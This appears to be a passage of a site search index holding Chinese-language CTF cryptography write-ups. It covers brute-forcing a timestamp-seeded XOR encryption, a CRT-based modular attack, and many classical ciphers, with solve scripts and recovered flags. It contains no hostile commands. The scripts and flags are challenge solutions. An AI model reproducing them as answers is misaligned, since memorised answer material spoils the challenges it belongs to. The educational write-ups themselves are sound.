<p>\u7531\u4e8e\u8f93\u5165\u6587\u4ef6\u662f PNG\uff0c\u6587\u4ef6\u5934\u662f\u56fa\u5b9a\u7684\uff0c\u53ef\u4ee5\u7206\u7834</p> <p>\u5148\u83b7\u53d6\u6587\u4ef6\u65f6\u95f4\u6233</p> <p></p> <pre><code>import time\n\nt = \"2014-11-22 22:46:30\"\n# \u8f6c\u6362\u6210\u65f6\u95f4\u6570\u7ec4\ntimeArray = time.strptime(t, \"%Y-%m-%d %H:%M:%S\")\n# \u8f6c\u6362\u6210\u65f6\u95f4\u6233\ntimestamp = time.mktime(timeArray)      # 1416667590.0\n</code></pre> <p>\u518d\u7f16\u5199\u811a\u672c\u7206\u7834</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[]) {\n  // cipher \u4ee5\u4e8c\u8fdb\u5236\u8bfb\u65b9\u5f0f\u6253\u5f00\u52a0\u5bc6\u6587\u4ef6\n  FILE *cipher = fopen(argv[1], \"rb\");\n\n  // plain \u4ee5\u4e8c\u8fdb\u5236\u5199\u65b9\u5f0f\u6253\u5f00\u7528\u4e8e\u8f93\u51fa\u89e3\u5bc6\u5185\u5bb9\u7684\u6587\u4ef6\n  FILE *plain = fopen(argv[2], \"wb\");\n\n  // \u5c06\u547d\u4ee4\u884c\u53c2\u6570\u4e2d\u7684\u79cd\u5b50\uff08\u5b57\u7b26\u4e32\uff09\u8f6c\u4e3a\u6574\u6570\n  unsigned int seed = atoi(argv[3]);\n  int c;\n\n  // \u7528\u63d0\u4f9b\u7684\u79cd\u5b50\u521d\u59cb\u5316\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u4f7f\u5f97 rand() \u751f\u6210\u7684\u5e8f\u5217\u4e0e\u52a0\u5bc6\u65f6\u4e00\u81f4\n  srand(seed);\n\n  // \u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5e76\u4e0e rand() \u751f\u6210\u7684\u968f\u673a\u5b57\u8282\u5f02\u6216\u8fd8\u539f\u51fa\u539f\u6587\n  // \u5c06\u8fd8\u539f\u540e\u7684\u5b57\u8282\u5199\u5165\u8f93\u51fa\u6587\u4ef6\n  // \u7ee7\u7eed\u4e0b\u4e00\u5b57\u8282\uff0c\u76f4\u5230\u6587\u4ef6\u7ed3\u675f\n  // \u8fd9\u91cc\u7684 &amp; 0xff \u662f\u4e3a\u4e86\u5c06 int \u5f3a\u5236\u9650\u5b9a\u5728 0\u2013255 \u8303\u56f4\u5185\uff0c\u9632\u6b62\u7b26\u53f7\u6269\u5c55\u7b49\u9519\u8bef\n  c = (fgetc(cipher) &amp; 0xff) ^ (rand() &amp; 0xff);\n  while (!feof(cipher)) {\n    fputc(c, plain);\n    c = (fgetc(cipher) &amp; 0xff) ^ (rand() &amp; 0xff);\n  }\n\n  // \u5173\u95ed\u6587\u4ef6\n  fclose(plain);\n  fclose(cipher);\n}\n</code></pre> <p>\u7531\u4e8e\u539f\u6765\u7684\u52a0\u5bc6\u7a0b\u5e8f\u662f<code>elf</code>\uff0c\u4e5f\u5373\u662f Linux \u7cfb\u7edf\u4e0b\u6267\u884c\u7684\u52a0\u5bc6\u8fc7\u7a0b</p> <p>\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728 Linux \u7f16\u8bd1\u8fd9\u4e2a\u89e3\u5bc6\u811a\u672c\uff08Windows \u4e0b\u7f16\u8bd1\u6b64\u811a\u672c\u751f\u6210\u7684<code>exe</code>\u65e0\u6cd5\u4f7f\u7528\uff09</p> <pre><code>gcc decode.c -o decode\n</code></pre> <p>\u8fdb\u884c\u89e3\u5bc6</p> <pre><code>decode ecrypt1.bin output.png 1416667590.0\n</code></pre> <p>\u5f97\u5230\u56fe\u7247</p> <p></p> <pre><code>\u5df2\u77e5\uff1aN \u53ef\u76f4\u63a5\u5206\u89e3\u4e3a\u4e09\u5bf9 p,q\n</code></pre> \\[ \\begin{aligned} &amp;C\\ =\\ M(M\\ +\\ B)\\mod\\ N\\\\\\\\ &amp;\\because\\ Structure-preserving\\ \\ properties\\ \\ of\\ \\ modular\\ \\ arithmetic\\\\\\\\ &amp;Such\\ \\ as:\\\\\\\\ &amp;\\ \\ \\ \\ \\ \\ \\ \\ If\\ \\ a\\ \\equiv\\ b\\mod\\ N\\\\\\\\ &amp;\\ \\ \\ \\ \\ \\ \\ \\ a\\mod\\ p\\ \\equiv\\ b\\mod\\ p,\\ \\ a\\mod\\ q\\ \\equiv\\ b\\mod\\ q\\\\\\\\ &amp;So\\ \\ we\\ \\ assumptions:\\\\\\\\ &amp;\\ \\ \\ \\ \\ \\ \\ \\ C_p\\ =\\ C\\mod\\ p,\\ \\ C_q\\ =\\ C\\mod\\ q\\\\ &amp;\\ \\ \\ \\ \\ \\ \\ \\ M_p\\ =\\ M\\mod\\ p,\\ \\ M_q\\ =\\ M\\mod\\ q\\\\ &amp;\\ \\ \\ \\ \\ \\ \\ \\ B\\ &lt;\\ p,q\\\\\\\\ &amp;\\ \\ \\ \\ \\ \\ \\ \\ \\begin{cases}\\ C_p\\ \\equiv\\ M_P\\ *\\ (M_p\\ +\\ B)\\mod\\ p\\\\\\ C_q\\ \\equiv\\ M_q\\ *\\ (M_q\\ +\\ B)\\mod\\ q\\end{cases}\\\\\\\\ &amp;If\\ \\ we\\ \\ find\\ \\ the\\ \\ only\\ \\ M:\\ \\ \\begin{cases}\\ M\\ \\equiv\\ m_P\\mod\\ p\\\\\\ M\\ \\equiv\\ m_q\\mod\\ q\\end{cases}\\\\\\\\ \\end{aligned} \\] <pre><code>\u6700\u540e\u4e00\u6b65\u89e3\u91ca\uff1a\u56e0\u4e3a\u6211\u4eec\u521a\u521a\u5b9a\u4e49\u7684 m_p \u548c m_q \u672c\u6765\u5c31\u662f m \u5728\u6a21 p \u548c\u6a21 q \u4e0b\u7684\u4f59\u6570\n\u6bd4\u5982\u8bf4\u4f60\u6709\u4e00\u4e2a\u6574\u6570 m = 123\uff0c\n\u90a3\u5728\u6a21 5 \u4e0b\u5c31\u662f\uff1am mod 5 = 3\n\u5728\u6a21 7 \u4e0b\u5c31\u662f\uff1am mod 7 = 4\n\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u8bf4\uff1a\n</code></pre> \\[ &amp;\\begin{cases}\\ m\\ \\equiv\\ 3\\ (mod\\ 5)\\\\\\ m\\ \\equiv\\ 4\\ (mod\\ 7)\\end{cases}\\\\\\\\ \\] <pre><code>\u8fd9\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u540c\u4f59\u65b9\u7a0b\u7ec4\n</code></pre> <pre><code>from functools import reduce\nimport gmpy2\nfrom Crypto.Util.number import *\n\np = [868019, 875543, 597263]\nq = [913799, 904727, 890459]\nC = [0x8D5051562B, 0x5FFA0AC1A2, 0x6008DDF867]\nB = [0xFFEEE,0xFFFEE,0xFEFEF]\n\ndef CRT(moudle,a):\n    M = reduce((lambda x,y : x * y),moudle)\n    result = 0\n    for mi in moudle:\n        Mi = M // mi\n        inv_Mi = gmpy2.invert(Mi,mi)\n        result = (result + a[moudle.index(mi)] * Mi * inv_Mi) % M\n    return result % M\n\nfor i in range(0,len(p)):\n    for a1 in [m_p for m_p in range(p[i]) if (C[i] % p[i]) == (m_p * (m_p + B[i])) % p[i]]:\n        # \u904d\u5386\u6240\u6709\u5c0f\u4e8e p[i] \u7684\u503c\n        for a2 in [m_q for m_q in range(q[i]) if (C[i] % q[i]) == (m_q * (m_q + B[i])) % q[i]]:\n            # \u904d\u5386\u6240\u6709\u5c0f\u4e8e q[i] \u7684\u503c\n            x = CRT([p[i],q[i]],[a1,a2])\n            try:\n                if \"2\" not in bytes.decode(long_to_bytes(x)): # \u7b80\u5355\u8fc7\u6ee4\u6389\u4e86\u4e00\u4e2a\u4e0d\u662f flag \u7684\u53c8\u662f\u53ef\u89c1\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\n                    print(bytes.decode(long_to_bytes(x)),end=\"\")\n            except:\n                continue\n</code></pre>"},{"location":"Crypto/Chapter4/","title":"Index","text":""},{"location":"Crypto/Chapter4/#albert-gonzalez","title":"Albert Gonzalez","text":"<p>\u5728\u79d1\u5c14\u5c3c\uff0c\u4ed6\u88ab\u6307\u63a7\u4e3a ShadowCrew \u9ed1\u5ba2\u96c6\u56e2\u7684\u4e3b\u8c0b\uff0c\u8be5\u96c6\u56e2\u8d29\u5356\u4e86 150 \u4e07\u4e2a\u88ab\u76d7\u7684\u4fe1\u7528\u5361\u548c ATM \u5361\u53f7</p> <p>\u5728\u4e0e\u7279\u52e4\u5c40\u5408\u4f5c\u7684\u540c\u65f6\uff0c\u636e\u79f0\u4ed6\u7b56\u5212\u4e86\u5bf9 TJX \u516c\u53f8\u7684\u9ed1\u5ba2\u653b\u51fb\uff0c\u5728\u622a\u81f3 2007 \u5e74\u7684 18 \u4e2a\u6708\u5185\uff0c4560 \u4e07\u5f20\u4fe1\u7528\u5361\u548c\u501f\u8bb0\u5361\u53f7\u88ab\u76d7</p> <p>2008 \u5e74 5 \u6708 7 \u65e5\uff0c\u5188\u8428\u96f7\u65af\u56e0\u4ece\u7ebd\u7ea6\u5dde Islandia \u4e00\u5bb6\u9910\u5385\u7684\u9500\u552e\u70b9\u4fb5\u5165Dave &amp; Buster \u516c\u53f8\u7f51\u7edc\u800c\u88ab\u6355\u3002\u8be5\u4e8b\u4ef6\u53d1\u751f\u5728 2007 \u5e74 9 \u6708\u3002\u7ea6\u6709 5000 \u5f20\u5361\u53f7\u88ab\u76d7\u3002\u636e\u62a5\u544a\uff0c\u5176\u4e2d 675 \u5f20\u5361\u88ab\u76d7\u4ea4\u6613\u603b\u989d\u8fbe 600,000 \u7f8e\u5143</p> <p></p>"},{"location":"Crypto/Chapter4/4-1/","title":"Rot13","text":""},{"location":"Crypto/Chapter4/4-1/#rot13","title":"Rot13","text":"<p>\u5177\u4f53\u64cd\u4f5c\u662f\u5c06\u5b57\u6bcd\u8868\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u66ff\u6362\u4e3a\u8be5\u5b57\u6bcd\u540e\u79fb 13 \u4e2a\u4f4d\u7f6e\u7684\u5b57\u6bcd</p> <pre><code>A -&gt; N\nB -&gt; O\nC -&gt; P\n...\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-10/","title":"\u5723\u5802\u6b66\u58eb\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-10/#\u5723\u5802\u6b66\u58eb\u5bc6\u7801","title":"\u5723\u5802\u6b66\u58eb\u5bc6\u7801","text":"<p>\u5723\u5802\u6b66\u58eb\u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>\u7c7b\u578b\u4e09\u89d2\u5f62\u56fe\u5f62\n</code></pre> <p></p> <p>\u5bf9\u7167\u4e0a\u56fe\u89e3\u51fa flis</p> <p></p>"},{"location":"Crypto/Chapter4/4-11/","title":"Vigenere","text":""},{"location":"Crypto/Chapter4/4-11/#vigenere","title":"Vigenere","text":"<p>\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5219\u662f\u7531\u4e00\u4e9b\u504f\u79fb\u91cf\u4e0d\u540c\u7684\u51ef\u6492\u5bc6\u7801\u7ec4\u6210</p> <p></p> <p>\u4f8b\u5982\uff0c\u5047\u8bbe\u660e\u6587\u4e3a\uff1a</p> <pre><code>ATTACKATDAWN\n</code></pre> <p>\u9009\u62e9\u67d0\u4e00\u5173\u952e\u8bcd\u5e76\u91cd\u590d\u800c\u5f97\u5230\u5bc6\u94a5\uff0c\u5982\u5173\u952e\u8bcd\u4e3a <code>LEMON</code> \u65f6\uff0c\u5bc6\u94a5\u4e3a\uff1a</p> <pre><code>LEMONLEMONLE\n</code></pre> <p>\u5bf9\u4e8e\u660e\u6587\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd <code>A</code>\uff0c\u5bf9\u5e94\u5bc6\u94a5\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd <code>L</code>\uff0c\u4e8e\u662f\u4f7f\u7528\u8868\u683c\u4e2d <code>L</code> \u884c\u5b57\u6bcd\u8868\u8fdb\u884c\u52a0\u5bc6\uff0c\u5f97\u5230\u5bc6\u6587\u7b2c\u4e00\u4e2a\u5b57\u6bcd  L</p> <p>\u4ee5\u6b64\u7c7b\u63a8\u5f97\u5230\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u4e3a <code>X</code></p> <p>Vigenere \u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>\u53e4\u5bc6\u7801\u4f7f\u7528\u79d8\u94a5\u7684\uff0c\u6309\u79d8\u94a5\u79fb\u52a8 26 \u4e2a\u82f1\u6587\u5b57\u6bcd\n</code></pre>"},{"location":"Crypto/Chapter4/4-12/","title":"\u56db\u65b9\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-12/#\u56db\u65b9\u5bc6\u7801","title":"\u56db\u65b9\u5bc6\u7801","text":"<p>\u56db\u65b9\u5bc6\u7801\u91c7\u7528 4 \u4e2a 5x5 \u77e9\u9635\u6765\u52a0\u5bc6</p> <p>\u9996\u5148\u9009\u62e9\u4e24\u4e2a\u82f1\u6587\u5b57\u4f5c\u5bc6\u5319\uff0c\u4f8b\u5982 example \u548c keyword</p> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u5bc6\u5319\uff0c\u5c06\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\u53bb\u9664\uff0c\u5373 example \u8981\u8f6c\u6210 exampl</p> <p>\u540e\u5c06\u6bcf\u4e2a\u5b57\u6bcd\u987a\u5e8f\u653e\u5165\u77e9\u9635\uff0c\u518d\u5c06\u4f59\u4e0b\u7684\u5b57\u6bcd\u987a\u5e8f\u653e\u5165\u77e9\u9635\uff0c\u4fbf\u5f97\u51fa\u52a0\u5bc6\u77e9\u9635</p> <pre><code>a b c d e   E X A M P\nf g h i j   L B C D F\nk l m n o   G H I J K\np r s t u   N O R S T\nv w x y z   U V W Y Z\n\nK E Y W O   a b c d e\nR D A B C   f g h i j\nF G H I J   k l m n o\nL M N P S   p r s t u\nT U V X Z   v w x y z\n</code></pre> <p>\u4e24\u4e2a\u5b57\u6bcd\u4e00\u7ec4\u5730\u5206\u5f00\u8baf\u606f\uff1a\uff08\u4f8b\u5982 hello world \u53d8\u6210 he ll ow or ld\uff09</p> <p>\u627e\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5728\u5de6\u4e0a\u89d2\u77e9\u9635\u7684\u4f4d\u7f6e\uff1ah</p> <p>\u540c\u6837\u9053\u7406\uff0c\u627e\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u5728\u53f3\u4e0b\u89d2\u77e9\u9635\u7684\u4f4d\u7f6e\uff1ae</p> <p>\u627e\u53f3\u4e0a\u89d2\u77e9\u9635\u4e2d\uff0c\u548c\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u540c\u5217\u7684\u5b57\u6bcd\uff1aF</p> <p>\u627e\u5de6\u4e0b\u89d2\u77e9\u9635\u4e2d\uff0c\u548c\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u6bcd\u540c\u5217\u7684\u5b57\u6bcd\uff1aY</p> <p>\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u52a0\u5bc6\u8fc7\u7684\u8baf\u606f</p> <pre><code>he lp me ob iw an ke no bi\nFY GM KY HO BX MF KK KI MD\n</code></pre> <p>\u56db\u65b9\u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>\u53ea\u5305\u542b\u5b57\u6bcd\uff0c\u4e14\u6709\u4e24\u7ec4 Key\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-13/","title":"Polybius","text":""},{"location":"Crypto/Chapter4/4-13/#polybius","title":"Polybius","text":"<p>\u5b83\u662f\u4e00\u79cd\u57fa\u4e8e\u5b57\u6bcd\u77e9\u9635\u7684\u52a0\u5bc6\u65b9\u6cd5\uff0c\u5c06\u6bcf\u4e2a\u5b57\u6bcd\u6620\u5c04\u5230\u77e9\u9635\u4e2d\u7684\u4e00\u4e2a\u5750\u6807\u4f4d\u7f6e</p> <p></p> <p>hint \u63d0\u793a\u5bc6\u6587\u957f\u5ea6\u662f 14</p> <p></p> <p>Polybius\uff08\u6ce2\u5229\u6bd4\u5965\u65af\uff09 \u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>\u5bc6\u6587\u53ea\u6709 5 \u4e2a\u5b57\u7b26\n</code></pre> <p>\u7f16\u5199\u811a\u672c\u7206\u7834</p> <pre><code>import itertools\n\n\ndef main():\n    # \u539f\u59cb\u5b57\u7b26\u4e32\u548c\u5bc6\u6587\n    s = \"aeoiu\"\n\n    ciper = \"ouauuuoooeeaaiaeauieuooeeiea\"\n\n    # \u6267\u884c\u89e3\u7801\n    results = decode_ciper(s, ciper)\n\n    # \u6253\u5370\u6240\u6709\u53ef\u80fd\u7684\u89e3\u7801\u7ed3\u679c\n    for result in results:\n        print(result)\n\n\ndef generate_permutations(base):\n    \"\"\"\u751f\u6210\u5b57\u7b26\u4e32\u7684\u6240\u6709\u6392\u5217\"\"\"\n    return [\"\".join(p) for p in itertools.permutations(base, len(base))]\n\n\ndef encode_with_permutation(permutation, cipher):\n    \"\"\"\u6839\u636e\u6392\u5217\u751f\u6210\u5bf9\u5e94\u5bc6\u6587\u7684\u6570\u5b57\u8868\u793a\"\"\"\n    encoded = \"\"\n\n    for char in cipher:\n        # \u627e\u5230\u5b57\u7b26\u7d22\u5f15\u5e76\u8f6c\u6362\u4e3a 1~5 \u7684\u4f4d\u7f6e\n        encoded += str(permutation.index(char) + 1)\n\n    return encoded\n\n\ndef decode_numeric(encoded):\n    \"\"\"\u5c06\u6570\u5b57\u7f16\u7801\u8f6c\u6362\u56de\u660e\u6587\uff0c\u5904\u7406 Polybius \u65b9\u9635\u4e2d\u7684 i/j \u5408\u5e76\u60c5\u51b5\"\"\"\n    decoded = \"\"\n\n    for i in range(0, len(encoded), 2):  # \u6bcf\u6b21\u53d6\u4e24\u4e2a\u6570\u5b57\n        # \u8ba1\u7b97\u5b57\u7b26\u7684 ASCII \u503c\uff0c96 \u662f\u56e0\u4e3a 'a' \u7684 ASCII \u503c\u662f 97\n        ascii_value = (int(encoded[i]) - 1) * 5 + int(encoded[i + 1]) + 96\n\n        # \u5982\u679c\u8d85\u8fc7 'i' \u7684 ASCII \u503c\uff0c\u8bf4\u660e\u662f 'j' \u6216\u4e4b\u540e\u7684\u5b57\u7b26\n        if ascii_value &gt; ord('i'):\n            ascii_value += 1\n\n        # \u8f6c\u6362\u4e3a\u5b57\u7b26\n        decoded += chr(ascii_value)  \n\n    return decoded\n\n\n# \u4e3b\u6d41\u7a0b\ndef decode_ciper(base, cipher):\n    permutations = generate_permutations(base)\n\n    decoded_results = []\n\n    for perm in permutations:\n        numeric_representation = encode_with_permutation(perm, cipher)\n\n        decoded_text = decode_numeric(numeric_representation)\n\n        decoded_results.append(decoded_text)\n\n    return decoded_results\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Crypto/Chapter4/4-14/","title":"\u57f9\u6839\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-14/#\u57f9\u6839\u5bc6\u7801","title":"\u57f9\u6839\u5bc6\u7801","text":"<p>\u52a0\u5bc6\u65f6\uff0c\u660e\u6587\u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u4f1a\u8f6c\u6362\u6210\u4e00\u7ec4\u4e94\u4e2a\u82f1\u6587\u5b57\u6bcd</p> <p>\u5176\u8f6c\u6362\u4f9d\u9760\u4e0b\u8868\uff1a</p> <pre><code>a   AAAAA   g     AABBA   n    ABBAA   t     BAABA\nb   AAAAB   h     AABBB   o    ABBAB   u-v   BAABB\nc   AAABA   i-j   ABAAA   p    ABBBA   w     BABAA\nd   AAABB   k     ABAAB   q    ABBBB   x     BABAB\ne   AABAA   l     ABABA   r    BAAAA   y     BABBA\nf   AABAB   m     ABABB   s    BAAAB   z     BABBB\n</code></pre> <p>\u57f9\u6839\u52a0\u5bc6\u7279\u70b9\uff1a</p> <pre><code>\u53ea\u6709 a\u3001b \u4e24\u79cd\u5b57\u7b26\uff0c\u4e14\u957f\u5ea6\u662f 5 \u7684\u500d\u6570\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-15/","title":"\u4eff\u5c04\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-15/#\u4eff\u5c04\u5bc6\u7801","title":"\u4eff\u5c04\u5bc6\u7801","text":"<p>\u4eff\u5c04\u52a0\u5bc6\u4f7f\u7528\u4ee5\u4e0b\u516c\u5f0f\u5bf9\u6bcf\u4e2a\u660e\u6587\u5b57\u7b26\u8fdb\u884c\u52a0\u5bc6\u548c\u89e3\u5bc6\uff1a $$ \\begin{aligned} C = (a * P + b) mod m \\end{aligned} $$</p> <pre><code>C\uff1a\u5bc6\u6587\u5b57\u7b26\u5bf9\u5e94\u7684\u6570\u5b57\nP\uff1a\u660e\u6587\u5b57\u7b26\u5bf9\u5e94\u7684\u6570\u5b57\uff08\u4f8b\u5982\uff0cA=0, B=1, ..., Z=25\uff09\na \u548c b\uff1a\u5bc6\u94a5\uff0c\u5176\u4e2d a \u5fc5\u987b\u4e0e\u6a21\u6570 m \u4e92\u8d28\nm\uff1a\u5b57\u6bcd\u8868\u7684\u5927\u5c0f\uff08\u4f8b\u5982\uff0c\u82f1\u8bed\u5b57\u6bcd\u8868 m = 26\uff09\n</code></pre> \\[ \\begin{aligned} P\\ =\\ a^{-1}\\ *\\ (C\\ -\\ b)\\ mod\\ m \\end{aligned} \\] <pre><code>\u5047\u8bbe\u5bc6\u94a5 a = 5\uff0cb = 8\uff0c\u52a0\u5bc6\u660e\u6587 \"HELLO\"\n\n\u5c06\u5b57\u6bcd\u8f6c\u6362\u4e3a\u6570\u5b57\uff1a\n\nH = 7, E = 4, L = 11, L = 11, O = 14\n\n\u5bf9\u6bcf\u4e2a\u5b57\u6bcd\u5e94\u7528\u52a0\u5bc6\u516c\u5f0f\uff1a\n\nH\uff1a17 -&gt; R\nE\uff1a2 -&gt; C\nL\uff1a11 -&gt; L\nL\uff1a11 -&gt; L\nO\uff1a0 -&gt; A\n</code></pre> <p>\u76f4\u63a5\u7206\u7834\u51fa flag</p> <pre><code>flag = \"szzyfimhyzd\"\n\nflaglist = []\n\nfor i in flag:\n    flaglist.append(ord(i)-97)\n\nflags = \"\"\n\nfor i in flaglist:\n    for j in range(0,26):\n        c = (17 * j - 8) % 26\n        if(c == i):\n            flags += chr(j+97)\n\nprint(flags)\n</code></pre>"},{"location":"Crypto/Chapter4/4-17/","title":"\u952e\u76d8\u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-17/#\u952e\u76d8\u5bc6\u7801","title":"\u952e\u76d8\u5bc6\u7801","text":"<p>\u6253\u5f00\u538b\u7f29\u5305\u4e00\u5806\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6\u540d\u89e3\u7801</p> <pre><code>ls|tr -d ' '|base64 -d\n</code></pre> <p></p> <p>\u7b80\u5355\u5b9a\u4f4d\u4e0b</p> <p></p> <p>\u8f93\u51fa\u6587\u4ef6\u770b\u770b\u5185\u5bb9</p> <p></p> <p>\u6700\u540e\u5224\u65ad\u51fa\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u5bf9\u7167\u7f51\u7ad9\u89e3\u5bc6\u518d\u51ef\u6492\u679a\u4e3e\u5373\u53ef</p> <pre><code>wdflag{ylyoselfve}\n</code></pre> <p></p>"},{"location":"Crypto/Chapter4/4-18/","title":"\u4e8c\u8fdb\u5236\u5e42\u6570\u52a0\u5bc6\u6cd5","text":""},{"location":"Crypto/Chapter4/4-18/#\u4e8c\u8fdb\u5236\u5e42\u6570\u52a0\u5bc6\u6cd5","title":"\u4e8c\u8fdb\u5236\u5e42\u6570\u52a0\u5bc6\u6cd5","text":"<p>\u4e0b\u8f7d\u9644\u4ef6</p> <p></p> <p>\u52a0\u5bc6\u539f\u7406\uff1a</p> <ol> <li>\u9996\u5148\uff0c\u5c06\u5b57\u6bcd\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5e8f\u53f7\uff08A=1, B=2, ..., Z=26\uff09</li> <li>\u7136\u540e\uff0c\u5c06\u8be5\u5e8f\u53f7\u5206\u89e3\u4e3a\u4e0d\u540c\u7684 2 \u7684\u5e42\u6b21\u4e4b\u548c\uff08\u5373\u4e8c\u8fdb\u5236\u5206\u89e3\uff09</li> </ol> <p>\u5b57\u6bcd <code>E</code> \u7684\u5e8f\u53f7\u662f 5\uff0c\u800c <code>5 = 2^0 + 2^2</code>\uff08\u5373 <code>1 + 4</code>\uff09\uff0c\u56e0\u6b64\u5176\u52a0\u5bc6\u7ed3\u679c\u4e3a <code>02</code>\uff08\u8868\u793a <code>2^0</code> \u548c <code>2^2</code> \u7684\u6307\u6570\uff09</p> <p>\u5b57\u6bcd <code>O</code> \u7684\u5e8f\u53f7\u662f 15\uff0c\u800c <code>15 = 2^0 + 2^1 + 2^2 + 2^3</code>\uff08\u5373 <code>1 + 2 + 4 + 8</code>\uff09\uff0c\u56e0\u6b64\u5176\u52a0\u5bc6\u7ed3\u679c\u4e3a <code>0123</code></p> <p>\u89e3\u5bc6\u539f\u7406\uff1a</p> <ol> <li>\u5c06\u5bc6\u6587\u7684\u6570\u5b57\u90e8\u5206\u62c6\u5206\uff08\u5982 <code>02</code> \u2192 <code>0, 2</code>\uff09</li> <li>\u8ba1\u7b97 <code>2^0 + 2^2 = 1 + 4 = 5</code>\uff0c\u5bf9\u5e94\u5b57\u6bcd <code>E</code></li> </ol> <p>\u56e0\u4e3a\u63d0\u793a\u662f\u516b\u4f4d\u5927\u5199\u5b57\u6bcd\uff0c\u53c8\u53d1\u73b0\u6709 7 \u4e2a 0\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u731c\u60f3\u5206\u6210 8 \u6bb5</p> <pre><code>a=[\"88421\",\"0122\",\"048\",\"02244\",\"04\",\"0142242\",\"0248\",\"0122\"] \nflag=\"\"\n\nfor j in range(0,len(a)): \n    str = a[j] \n    list=[] \n    sum=0 \n    for i in str: \n        list.append(i) \n        length = len(list) \n    for i in range(0,length): \n        sum+=int(list[i]) \n    flag+=chr(64+sum)\n\nprint flag\n</code></pre>"},{"location":"Crypto/Chapter4/4-19/","title":"Poem Codes \u5bc6\u7801","text":""},{"location":"Crypto/Chapter4/4-19/#poem-codes-\u5bc6\u7801","title":"Poem Codes \u5bc6\u7801","text":"<p>\u6253\u5f00\u9644\u4ef6</p> <p></p> <p>\u5bc6\u94a5\u51c6\u5907\uff1a\u8bd7\u6b4c</p> <ul> <li>\u901a\u4fe1\u53cc\u65b9\u9700\u9884\u5148\u5171\u4eab\u4e00\u9996\u8bd7\u6b4c\uff08\u6216\u4efb\u4f55\u56fa\u5b9a\u6587\u672c\uff09\uff0c\u4f5c\u4e3a\u5bc6\u94a5</li> <li>\u4f8b\u5982\uff0c\u8bd7\u6b4c\u9009\u81ea\u838e\u58eb\u6bd4\u4e9a\u7684\u5341\u56db\u884c\u8bd7\uff1a   \"Shall I compare thee to a summer's day?\"</li> </ul> <p>\u5bc6\u94a5\u5904\u7406\uff1a\u751f\u6210\u6570\u5b57\u5e8f\u5217</p> <ul> <li>\u5c06\u8bd7\u6b4c\u8f6c\u6362\u4e3a\u8fde\u7eed\u7684\u5b57\u6bcd\uff0c\u5ffd\u7565\u6807\u70b9\u3001\u7a7a\u683c\u548c\u5927\u5c0f\u5199\uff0c\u5e76\u7ed9\u6bcf\u4e2a\u5b57\u6bcd\u6309\u987a\u5e8f\u7f16\u53f7\uff08\u4ece 1 \u5f00\u59cb\uff09\uff1a</li> </ul> <pre><code>S(1), H(2), A(3), L(4), L(5), I(6), C(7), O(8), M(9), P(10), A(11), R(12), E(13), ...  \n</code></pre> <ul> <li>\u5bf9\u6bcf\u4e2a\u5b57\u6bcd\uff0c\u53d6\u5176\u5728\u8bd7\u6b4c\u4e2d\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\u7f16\u53f7\uff0c\u4f5c\u4e3a\u5bc6\u94a5\u6570\u5b57</li> </ul> <p>\u4f8b\u5982\uff0c\u5b57\u6bcd <code>A</code> \u9996\u6b21\u51fa\u73b0\u5728\u7b2c 3 \u4f4d\uff0c<code>E</code> \u5728\u7b2c 13 \u4f4d\uff0c<code>S</code> \u5728\u7b2c 1 \u4f4d</p> <p>\u52a0\u5bc6\u8fc7\u7a0b\uff1a\u66ff\u6362\u5b57\u6bcd</p> <p>\u5047\u8bbe\u660e\u6587\u4e3a <code>\"ATTACK\"</code>\uff0c\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>\u5bf9\u9f50\u660e\u6587\u4e0e\u5bc6\u94a5\u6570\u5b57\uff1a</li> <li>\u5c06\u660e\u6587\u6bcf\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u7684\u5bc6\u94a5\u6570\u5b57\u6309\u987a\u5e8f\u5199\u51fa\uff08\u82e5\u8bd7\u6b4c\u4e0d\u591f\u957f\uff0c\u53ef\u5faa\u73af\u91cd\u590d\u8bd7\u6b4c\uff09</li> <li>\u4f8b\u5982\uff0c\u5bf9 <code>A T T A C K</code>\uff1a<ul> <li><code>A</code> \u2192 \u9996\u6b21\u5728\u8bd7\u6b4c\u7b2c3\u4f4d \u2192 \u5bc6\u94a5\u6570\u5b57 3</li> <li><code>T</code> \u2192 